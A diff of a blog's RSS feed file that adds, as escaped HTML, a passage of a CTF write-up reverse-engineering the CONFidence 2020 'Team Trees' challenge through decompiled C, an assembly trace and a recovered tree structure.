@@ -3,12 +3,12 @@
   <channel>
     <title>confidence-ctf on Black Bauhinia</title>
     <link>https://b6a.black/tags/confidence-ctf/</link>
-    <description>Recent content in confidence-ctf on Black Bauhinia</description>
+    <description>Black Bauhinia (confidence-ctf)</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <lastBuildDate>Tue, 08 Sep 2020 18:30:00 +0800</lastBuildDate>
     
-	<atom:link href="https://b6a.black/tags/confidence-ctf/index.xml" rel="self" type="application/rss+xml" />
+    <atom:link href="https://b6a.black/tags/confidence-ctf/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
@@ -17,9 +17,685 @@
       <pubDate>Tue, 08 Sep 2020 18:30:00 +0800</pubDate>
       
       <guid>https://b6a.black/posts/2020-09-08-confidencectf-team-trees/</guid>
-      <description>This week, we have teamed up as @blackb6a to play CONFidence 2020 CTF. We end up ranked 15, but we are more proud of ourselves able to solve a reversing challenge called Team Trees (395 points, 5 solves).
-In particular, we are the first-to-solve to the challenge. It took us around two hours to win the flag. This writeup is written by @harrier_lcc and @mystiz613.
-Challenge Summary  We wanted to plant a lot of trees, but it&#39;s going kinda slow.</description>
+      <description>&lt;p&gt;This week, we have teamed up as @blackb6a to play CONFidence 2020 CTF. We end up ranked 15, but we are more proud of ourselves able to solve a reversing challenge called Team Trees (395 points, 5 solves).&lt;/p&gt;
+
+&lt;p&gt;In particular, we are the first-to-solve to the challenge. It took us around two hours to win the flag. This writeup is written by @harrier_lcc and @mystiz613.&lt;/p&gt;
+
+&lt;h2 id=&#34;challenge-summary&#34;&gt;Challenge Summary&lt;/h2&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;We wanted to plant a lot of trees, but it&#39;s going kinda slow...&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;We are given a binary that executes a slow algorithm that takes up a lot of memory. The objective is to wait the program until it is done - the flag would be shown as the output.&lt;/p&gt;
+
+&lt;figure&gt;
+    &lt;img src=&#34;https://b6a.black/images/2020-09-08-confidencectf/i-can-explain.png&#34;/&gt; 
+&lt;/figure&gt;
+
+
+&lt;p&gt;&lt;strong&gt;Never.&lt;/strong&gt; Our PCs don&#39;t even have enough memory to play with that. Even so, we gotta wait forever for the flag. Our objective is to optimize and rewrite the algorithm used. By optimize we mean reduce &lt;em&gt;both&lt;/em&gt; the time and space complexities.&lt;/p&gt;
+
+&lt;h2 id=&#34;solution&#34;&gt;Solution&lt;/h2&gt;
+
+&lt;h3 id=&#34;part-i-baby-steps-from-baby-cases&#34;&gt;Part I: Baby steps from baby cases&lt;/h3&gt;
+
+&lt;p&gt;From the binary, we knew that we are going to find $f(1337)$ for a given $f$. Although we do not know what $f$ is, we could still have an insight on it. For example, we can patch &lt;code&gt;1337&lt;/code&gt; by smaller values: &lt;code&gt;0&lt;/code&gt;, &lt;code&gt;1&lt;/code&gt;, etc.:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;n = 0: p4{32b9b6bca55548ed88ec405c5c7cf3a1}
+n = 1: p4{ee5fadd5a727857f32b9b6bca55548ed}
+n = 2: p4{ee5fadd5a727857f982d2435efffdac7}
+n = 3: p4{c8b5922a9f156985b4f8094372145c13}
+...
+n = 4: Out of memory ;_;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;In particular, &lt;code&gt;32b9b6bca55548ed&lt;/code&gt; in the output for $n = 0$ is the &lt;code&gt;v1&lt;/code&gt; in &lt;code&gt;sub_400816&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; __noreturn &lt;span style=&#34;color:#a6e22e&#34;&gt;sub_400816&lt;/span&gt;()
+{
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v0; &lt;span style=&#34;color:#75715e&#34;&gt;// rdx
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;signed&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v1; &lt;span style=&#34;color:#75715e&#34;&gt;// rcx
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;signed&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v2; &lt;span style=&#34;color:#75715e&#34;&gt;// rt0
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+  v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x82F96AC97429A68BLL&lt;/span&gt;;
+  v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x32B9B6BCA55548EDLL&lt;/span&gt;;
+  __debugbreak();
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; )
+  {
+    v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1;
+    v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v0 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;;
+    v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v2;
+  }
+}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;But what is &lt;code&gt;88ec405c5c7cf3a1&lt;/code&gt;? It must be related to &lt;code&gt;v0&lt;/code&gt; and &lt;code&gt;v1&lt;/code&gt;. We tried &lt;code&gt;3*v0 + 2*v1 + 4&lt;/code&gt; and it is &lt;code&gt;ee5fadd5a727857f&lt;/code&gt;. It does not check out.&lt;/p&gt;
+
+&lt;p&gt;We have spot out that the output shares the same prefix when $n=1$ and $n=2$. Maybe we shall see what is going on with &lt;code&gt;sub_400816&lt;/code&gt; - it is simply generating numbers for a sequence, namely $s_n$, indefinitely:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;$s_0 = \text{82F96AC97429A68B}_{16}$,&lt;/li&gt;
+&lt;li&gt;$s_1 = \text{32B9B6BCA55548ED}_{16}$, and&lt;/li&gt;
+&lt;li&gt;$s_k = 3 s_{k-2} + 2 s_{k-1} + 4\mod2^{64}$ for $k \geq 2$.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Let&#39;s generate a bunch of $a_k$&#39;s to see if there is something interesting:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;s_2 = 0xee5fadd5a727857f
+s_3 = 0x74ec7fe13e4ee5c9
+s_4 = 0xb4f8094372145c13
+s_5 = 0xc8b5922a9f156985
+...&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;If we rewrite the program output in terms of $s_k$, we have:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;n = 0: p4{s_1 88ec405c5c7cf3a1}
+n = 1: p4{s_2 32b9b6bca55548ed}
+n = 2: p4{s_2 982d2435efffdac7}
+n = 3: p4{s_5 s_4}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The output when $n = 3$ is actually composed by two elements in the sequence. It makes us think: is it the case that &lt;code&gt;88ec...&lt;/code&gt; (also &lt;code&gt;32b9...&lt;/code&gt; and &lt;code&gt;982d...&lt;/code&gt;) is an &lt;em&gt;intermediate state&lt;/em&gt;? To verify our thoughts, we are going to dig deeper into the assembly operations.&lt;/p&gt;
+
+&lt;figure&gt;
+    &lt;img src=&#34;https://b6a.black/images/2020-09-08-confidencectf/ida-400816.png&#34;/&gt; 
+&lt;/figure&gt;
+
+
+&lt;p&gt;There are &lt;em&gt;four&lt;/em&gt; operations. Here are the values of &lt;code&gt;v0&lt;/code&gt; and &lt;code&gt;v1&lt;/code&gt; (as defined in &lt;code&gt;sub_400816&lt;/code&gt;) after each of the steps.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;                        /* rcx = c0,              rdx = d0              */
+lea  rdx, [rdx+rdx*2]   /* rcx = c0,              rdx = 3*d0            */
+lea  rdx, [rdx+rcx*2+4] /* rcx = c0,              rdx = 3*d0 + 2*c0 + 4 */
+xchg rcx, rdx           /* rcx = 3*d0 + 2*c0 + 4, rdx = c0              */
+jmp  short loc_40082F   /* rcx = 3*d0 + 2*c0 + 4, rdx = c0              */&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;With that said, it takes four instructions for a complete cycle inside &lt;code&gt;while&lt;/code&gt;. From the smaller values of $n$, we can see that the output format would be &lt;code&gt;p4{[rdx][rcx]}&lt;/code&gt;. Let&#39;s see some starting values of &lt;code&gt;rcx&lt;/code&gt; and &lt;code&gt;rdx&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; step | rdx              | rcx
+------+------------------+------------------
+    0 | 32b9b6bca55548ed | 82f96ac97429a68b
+    1 | 32b9b6bca55548ed | 88ec405c5c7cf3a1 &amp;lt;- output when n=0
+    2 | 32b9b6bca55548ed | ee5fadd5a727857f
+    3 | ee5fadd5a727857f | 32b9b6bca55548ed &amp;lt;- output when n=1
+    4 | ee5fadd5a727857f | 32b9b6bca55548ed    ...or this?
+    5 | ee5fadd5a727857f | 982d2435efffdac7 &amp;lt;- output when n=2
+    6 | ee5fadd5a727857f | 74ec7fe13e4ee5c9
+    7 | 74ec7fe13e4ee5c9 | ee5fadd5a727857f
+    8 | 74ec7fe13e4ee5c9 | ee5fadd5a727857f
+    9 | 74ec7fe13e4ee5c9 | cb1f0980f576907d
+   10 | 74ec7fe13e4ee5c9 | b4f8094372145c13
+   11 | b4f8094372145c13 | 74ec7fe13e4ee5c9
+   12 | b4f8094372145c13 | 74ec7fe13e4ee5c9
+   13 | b4f8094372145c13 | 5ec57fa3baecb15b
+   14 | b4f8094372145c13 | c8b5922a9f156985
+   15 | c8b5922a9f156985 | b4f8094372145c13 &amp;lt;- output when n=3
+   16 | c8b5922a9f156985 | b4f8094372145c13    ...or this?
+   17 | c8b5922a9f156985 | 1ee81bca563d1439
+   18 | c8b5922a9f156985 | b053401f9467e747
+   19 | b053401f9467e747 | c8b5922a9f156985&lt;/code&gt;&lt;/pre&gt;
+&lt;div class=&#34;alert info&#34;&gt;
+  :bulb: &lt;strong&gt;Imagination:&lt;/strong&gt; You have opened a process with &lt;code&gt;gdb&lt;/code&gt; that has a breakpoint at the beginning of the function. You are given a set of something (&lt;em&gt;defined in &lt;code&gt;sub_40090D&lt;/code&gt;&lt;/em&gt;) and checks if it has a given attribute (&lt;em&gt;defined in &lt;code&gt;sub_4009C4&lt;/code&gt;&lt;/em&gt;). If so, you call &lt;code&gt;ni&lt;/code&gt; to move to the next step. Finally, you print the registers, extract &lt;code&gt;edx&lt;/code&gt; and &lt;code&gt;ecx&lt;/code&gt;, and print them as the flag.
+&lt;/div&gt;
+  
+
+&lt;p&gt;So... what is the set of something? And what is the attribute it is checked against?&lt;/p&gt;
+
+&lt;h3 id=&#34;part-ii-collecting-the-pieces-for-the-puzzle&#34;&gt;Part II: Collecting the pieces for the puzzle&lt;/h3&gt;
+
+&lt;p&gt;There are four functions that worth investigating: &lt;code&gt;sub_40090D&lt;/code&gt; (the enumerator), &lt;code&gt;sub_4009C4&lt;/code&gt; (the checker), &lt;code&gt;sub_400A59&lt;/code&gt; (the constructor) and &lt;code&gt;sub_400840&lt;/code&gt; (called from &lt;code&gt;sub_40090D&lt;/code&gt;). We will first look into &lt;code&gt;sub_400840&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sub_400840&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a1)
+{
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+14h] [rbp-Ch]
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  _DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v3; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+18h] [rbp-8h]
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+  v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; malloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x20uLL&lt;/span&gt;);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;v3 )
+  {
+    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Out of memory ;_;&amp;#34;&lt;/span&gt;);
+    abort();
+  }
+  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a1;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; i; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
+    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v3[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sub_400840(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; v3;
+}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Since it is allocating 32 bytes, we can define a dummy struct:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; Dummy {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; x[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;];
+};&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Loading the struct into IDA, by redefining the types of &lt;code&gt;a1&lt;/code&gt; and &lt;code&gt;v3&lt;/code&gt; as &lt;code&gt;Dummy*&lt;/code&gt;, we have:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;Dummy &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sub_400840&lt;/span&gt;(Dummy &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;src)
+{
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+14h] [rbp-Ch]
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  Dummy &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;dest; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+18h] [rbp-8h]
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+  dest &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (Dummy &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)malloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x20uLL&lt;/span&gt;);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;dest )
+  {
+    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Out of memory ;_;&amp;#34;&lt;/span&gt;);
+    abort();
+  }
+  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)dest&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)src&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;x;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)src&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; i; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
+    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;dest&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;x[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sub_400840(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(Dummy &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;src&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;x[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;]);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; dest;
+}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;It is calling itself recursively. Would it be a &lt;em&gt;deep clone&lt;/em&gt;? Moreover, we can further see that the first four bytes should be &lt;code&gt;size&lt;/code&gt; and it would not be greater than 3. Otherwise &lt;code&gt;8*i+8 &amp;gt;= 32&lt;/code&gt;, overflowing the struct. After all, we think it is a node of the tree - and this is the final struct we have:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; Node {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; size;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; x[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// unknown
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    Node &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;child[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
+};&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;More importantly, we can finally claim that &lt;code&gt;sub_400840&lt;/code&gt; is fully reversed.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;Node &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;clone&lt;/span&gt;(Node &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;src)
+{
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+14h] [rbp-Ch]
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  Node &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;dest; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+18h] [rbp-8h]
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+  dest &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (Node &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)malloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x20uLL&lt;/span&gt;);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;dest )
+  {
+    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Out of memory ;_;&amp;#34;&lt;/span&gt;);
+    abort();
+  }
+  dest&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; src&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;size;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; src&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; i; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
+    dest&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;child[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; clone(src&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;child[i]);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; dest;
+}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Then we will be reversing &lt;code&gt;sub_400A59&lt;/code&gt;. This function is simple, it is defining a path with length $n$. After the tree is constructed, it will be used by &lt;code&gt;sub_400BED&lt;/code&gt; for enumeration. How? Let&#39;s see a baby example when $n = 2$:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-viz-dot&#34; data-lang=&#34;viz-dot&#34;&gt;digraph {
+  t0_0[shape=point]
+  t0_1[shape=point]
+  t0_2[shape=point]
+  t0_0 -&amp;gt; t0_1 [arrowhead=false]
+  t0_1 -&amp;gt; t0_2 [arrowhead=false]
+  
+  x0[shape=point,style=invis]
+  y0[shape=point,style=invis]
+  x0-&amp;gt;y0
+  
+  t1_0[shape=point]
+  t1_1[shape=point]
+  t1_2[shape=point]
+  t1_3[shape=point]
+  t1_0 -&amp;gt; t1_1 [arrowhead=false]
+  t1_1 -&amp;gt; t1_2 [arrowhead=false]
+  t1_1 -&amp;gt; t1_3 [arrowhead=false]
+  
+  x1[shape=point,style=invis]
+  y1[shape=point,style=invis]
+  x1-&amp;gt;y1
+  
+  t2_0[shape=point]
+  t2_1[shape=point]
+  t2_2[shape=point]
+  t2_3[shape=point]
+  t2_4[shape=point]
+  t2_0 -&amp;gt; t2_1 [arrowhead=false]
+  t2_1 -&amp;gt; t2_2 [arrowhead=false]
+  t2_1 -&amp;gt; t2_3 [arrowhead=false]
+  t2_1 -&amp;gt; t2_4 [arrowhead=false]
+  
+  x2[shape=point,style=invis]
+  y2[shape=point,style=invis]
+  x2-&amp;gt;y2
+  
+  t3_0[shape=point]
+  t3_1[shape=point]
+  t3_2[shape=point]
+  t3_3[shape=point]
+  t3_4[shape=point]
+  t3_0 -&amp;gt; t3_1 [arrowhead=false]
+  t3_0 -&amp;gt; t3_3 [arrowhead=false]
+  t3_1 -&amp;gt; t3_2 [arrowhead=false]
+  t3_3 -&amp;gt; t3_4 [arrowhead=false]
+  
+  x3[shape=point,style=invis]
+  y3[shape=point,style=invis]
+  x3-&amp;gt;y3
+  
+  t4_0[shape=point]
+  t4_1[shape=point]
+  t4_2[shape=point]
+  t4_3[shape=point]
+  t4_4[shape=point]
+  t4_5[shape=point]
+  t4_0 -&amp;gt; t4_1 [arrowhead=false]
+  t4_0 -&amp;gt; t4_3 [arrowhead=false]
+  t4_1 -&amp;gt; t4_2 [arrowhead=false]
+  t4_3 -&amp;gt; t4_4 [arrowhead=false]
+  t4_3 -&amp;gt; t4_5 [arrowhead=false]
+  
+  x4[shape=point,style=invis]
+  y4[shape=point,style=invis]
+  x4-&amp;gt;y4
+  
+  u[label=&amp;#34;...&amp;#34;, shape=plaintext]
+  
+  x5[shape=point,style=invis]
+  y5[shape=point,style=invis]
+  x5-&amp;gt;y5
+  
+  t5_0[shape=point]
+  t5_1[shape=point]
+  t5_2[shape=point]
+  t5_3[shape=point]
+  t5_4[shape=point]
+  t5_5[shape=point]
+  t5_6[shape=point]
+  t5_7[shape=point]
+  t5_8[shape=point]
+  t5_9[shape=point]
+  t5_10[shape=point]
+  t5_11[shape=point]
+  t5_12[shape=point]
+  
+  t5_0 -&amp;gt; t5_1 [arrowhead=false]
+  t5_0 -&amp;gt; t5_2 [arrowhead=false]
+  t5_0 -&amp;gt; t5_3 [arrowhead=false]
+  t5_1 -&amp;gt; t5_4 [arrowhead=false]
+  t5_1 -&amp;gt; t5_5 [arrowhead=false]
+  t5_1 -&amp;gt; t5_6 [arrowhead=false]
+  t5_2 -&amp;gt; t5_7 [arrowhead=false]
+  t5_2 -&amp;gt; t5_8 [arrowhead=false]
+  t5_2 -&amp;gt; t5_9 [arrowhead=false]
+  t5_3 -&amp;gt; t5_10 [arrowhead=false]
+  t5_3 -&amp;gt; t5_11 [arrowhead=false]
+  t5_3 -&amp;gt; t5_12 [arrowhead=false]
+  
+  {rank=same; t0_1; u; x0; y0; x1; y1; x2; y2; x3; y3; x4; y4; x5; y5}
+}&lt;/code&gt;&lt;/pre&gt;
